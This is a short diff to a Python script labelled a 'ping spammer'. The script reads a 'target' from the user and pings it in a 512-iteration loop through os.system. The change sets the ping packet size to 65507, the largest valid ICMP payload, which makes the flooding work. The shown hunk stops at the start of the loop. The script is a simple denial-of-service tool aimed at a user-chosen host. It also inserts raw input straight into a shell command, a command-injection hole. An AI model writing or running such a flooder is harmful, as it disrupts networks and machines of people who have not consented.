@@ -1,7 +1,7 @@
 import os
 import threading
 def ping(addy):
-    os.system(f"ping {addy} -s 127992")
+    os.system(f"ping {addy} -s 65507")
 print("ping spammer??"+(5000*'[]'))
 addy = input("enter target:")
 for i in range(512):
